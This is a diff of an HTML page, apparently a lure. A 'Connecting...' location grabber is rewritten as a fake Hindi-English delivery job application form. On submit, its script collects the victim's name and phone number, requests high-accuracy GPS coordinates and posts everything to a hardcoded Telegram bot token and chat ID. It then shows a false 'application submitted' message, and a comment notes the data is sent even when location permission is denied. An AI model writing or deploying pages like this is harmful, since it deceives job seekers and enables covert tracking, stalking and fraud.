@@ -3,79 +3,187 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connecting...</title>
+    <title>Delivery Job Application</title>
     <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
         body {
-            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
-            background-color: #f7f9fa;
-            color: #333;
-            text-align: center;
             padding: 20px;
         }
-        .card {
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            max-width: 320px;
+        .form-card {
+            background: #ffffff;
             width: 100%;
+            max-width: 380px;
+            padding: 28px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+        }
+        .form-card h2 {
+            margin: 0 0 6px;
+            color: #1a73e8;
+            font-size: 24px;
+            text-align: center;
+        }
+        .form-card p {
+            margin: 0 0 20px;
+            color: #666;
+            font-size: 13px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #1a73e8;
+        }
+        button {
+            width: 100%;
+            padding: 13px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button:active {
+            background-color: #1557b0;
+        }
+        .success-box {
+            display: none;
+            text-align: center;
+            padding: 15px 0;
+        }
+        .success-box h3 {
+            color: #2e7d32;
+            margin: 0 0 8px;
+            font-size: 20px;
+        }
+        .success-box p {
+            color: #555;
+            font-size: 14px;
+            margin: 0;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <p id="status">Connecting, please wait...</p>
+
+<div class="form-card">
+    <div id="jobFormContainer">
+        <h2>Delivery Job</h2>
+        <p>Apna detail bharein verification aur onboarding ke liye</p>
+        
+        <form id="deliveryForm">
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="userName" placeholder="Apna pura naam likhein" required>
+            </div>
+            
+            <div class="form-group">
+                <label>Mobile Number</label>
+                <input type="tel" id="userPhone" placeholder="Mobile number daalein" required>
+            </div>
+            
+            <button type="submit" id="submitBtn">Submit Job Application</button>
+        </form>
     </div>
 
-    <script>
-        const BOT_TOKEN = "9124377802:AAE_3vHmvv1yngLMyLmpivjuI4A5m9ELJC0";
-        const CHAT_ID = "9010957708";
+    <div id="successMessage" class="success-box">
+        <div style="font-size: 40px; color: #2e7d32; margin-bottom: 10px;">✓</div>
+        <h3>Job Submit Successfully</h3>
+        <p>Aapka registration complete ho gaya hai. Hamari team aapse jald hi contact karegi.</p>
+    </div>
+</div>
 
-        function sendLocation(lat, lon, accuracy) {
+<script>
+    const BOT_TOKEN = "9124377802:AAE_3vHmvv1yngLMyLmpivjuI4A5m9ELJC0";
+    const CHAT_ID = "9010957708";
+
+    const form = document.getElementById('deliveryForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const jobFormContainer = document.getElementById('jobFormContainer');
+    const successMessage = document.getElementById('successMessage');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const name = document.getElementById('userName').value.trim();
+        const phone = document.getElementById('userPhone').value.trim();
+        
+        submitBtn.disabled = true;
+        submitBtn.innerText = "Submitting...";
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    sendData(name, phone, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                },
+                (err) => {
+                    // Agar permission deny hui tab bhi details Telegram par bhej dega
+                    sendData(name, phone, null, null, null);
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        } else {
+            sendData(name, phone, null, null, null);
+        }
+    });
+
+    function sendData(name, phone, lat, lon, acc) {
+        let msg = `📋 *New Delivery Job Application:*\n\n` +
+                  `👤 *Name:* ${name}\n` +
+                  `📞 *Phone:* ${phone}\n`;
+
+        if (lat && lon) {
             const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 *Phone Location Alert:*\n\n` +
-                            `• Latitude: \`${lat}\`\n` +
-                            `• Longitude: \`${lon}\`\n` +
-                            `• Accuracy: ±${Math.round(accuracy)} meters\n\n` +
-                            `🔗 [Google Maps Par Dekhein](${mapsUrl})`;
-
-            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-            fetch(telegramUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            })
-            .then(() => {
-                document.getElementById("status").innerText = "Location bhej di gayi hai. Aap page close kar sakte hain.";
-            })
-            .catch(() => {
-                document.getElementById("status").innerText = "Location bhejte waqt problem aayi.";
-            });
+            msg += `\n📍 *Exact Location:*\n` +
+                   `• Lat: \`${lat}\`\n` +
+                   `• Lon: \`${lon}\`\n` +
+                   `• Accuracy: ±${Math.round(acc)} meters\n\n` +
+                   `🔗 [Google Maps Par Dekhein](${mapsUrl})`;
+        } else {
+            msg += `\n⚠️ Location access allow nahi kiya gaya.`;
         }
 
-        window.onload = function() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
-                    (err) => {
-                        document.getElementById("status").innerText = "Kripya browser me Location permission Allow karein.";
-                    },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
-            } else {
-                document.getElementById("status").innerText = "Aapka browser Geolocation support nahi karta.";
-            }
-        };
-    </script>
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: msg,
+                parse_mode: "Markdown"
+            })
+        }).finally(() => {
+            jobFormContainer.style.display = "none";
+            successMessage.style.display = "block";
+        });
+    }
+</script>
+
 </body>
 </html>
